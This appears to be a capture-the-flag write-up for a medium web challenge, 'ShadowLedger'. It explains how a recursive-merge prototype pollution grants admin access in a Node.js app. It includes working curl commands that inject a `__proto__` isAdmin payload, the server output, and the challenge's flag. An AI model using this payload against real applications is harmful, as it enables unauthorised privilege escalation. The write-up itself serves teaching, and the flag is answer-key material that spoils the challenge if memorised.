---
title: "ShadowLedger"
ctf: "CyberStrike CTF"
date: 2026-07-10
category: web
difficulty: medium
points: 250
flag_format: "cyberstrike{...}"
author: "retr0"
---

# ShadowLedger

## Summary

A Node.js financial record platform uses a lodash-style recursive merge to update user profiles. The `/admin/flag` route gates access on an `isAdmin` property that the user object does not own. Polluting `Object.prototype.isAdmin = true` via `__proto__` injection on the update endpoint makes the admin check pass.

## Solution

### Step 1: Recon

`GET /api/me` returns the current user without auth. `GET /admin/flag` returns `Access denied. Administrative credentials required.` The `POST /api/profile/update` endpoint accepts JSON and performs a recursive merge into the user object — a classic prototype-pollution sink (lodash `merge` / `defaultsDeep`).

### Step 2: Pollute `Object.prototype.isAdmin`

The user object has no `isAdmin` property, so property lookups fall through to `Object.prototype`. Injecting `__proto__.isAdmin = true` via the update endpoint pollutes the prototype and makes the admin check on `/admin/flag` resolve to `true`.

```bash
# 1. Pollute the prototype
curl -s -X POST http://chal.csc-snist.live:47970/api/profile/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

# 2. Retrieve the flag
curl -s http://chal.csc-snist.live:47970/admin/flag
```

```
{"message":"Profile updated.","user":{"id":1,"username":"player","email":"player@shadowledger.local"}}
{"flag":"cyberstrike{75886fc2518a64c15e25b946df2dad12}"}
```

## Flag

```
cyberstrike{75886fc2518a64c15e25b946df2dad12}
```
